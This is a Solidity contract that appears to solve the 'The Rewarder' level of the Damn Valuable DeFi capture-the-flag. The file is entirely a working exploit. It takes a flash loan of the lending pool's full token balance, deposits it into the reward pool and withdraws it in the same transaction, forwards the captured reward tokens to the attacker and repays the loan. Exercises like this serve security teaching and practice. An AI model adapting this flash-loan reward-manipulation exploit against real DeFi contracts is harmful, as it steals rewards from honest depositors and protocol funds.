// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";

contract TheRewarderAttacker {
    address public lender;
    address public rewarder;
    address attacker;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    constructor(address _lender, address _rewarder) {
        lender = _lender;
        rewarder = _rewarder;
        attacker = msg.sender;
        liquidityToken = FlashLoanerPool(_lender).liquidityToken();
        require(
            address(liquidityToken) ==
                TheRewarderPool(_rewarder).liquidityToken(),
            "Liquidities do not match"
        );
        rewardToken = TheRewarderPool(_rewarder).rewardToken();
    }

    function receiveFlashLoan(uint256 amount) external {
        require(
            msg.sender == lender,
            "Unexpected lender in flash loan callback"
        );
        liquidityToken.approve(rewarder, amount);
        TheRewarderPool(rewarder).deposit(amount);
        TheRewarderPool(rewarder).withdraw(amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
        liquidityToken.transfer(lender, amount);
    }

    function attack() external {
        uint256 amount = liquidityToken.balanceOf(lender);
        FlashLoanerPool(lender).flashLoan(amount);
    }
}
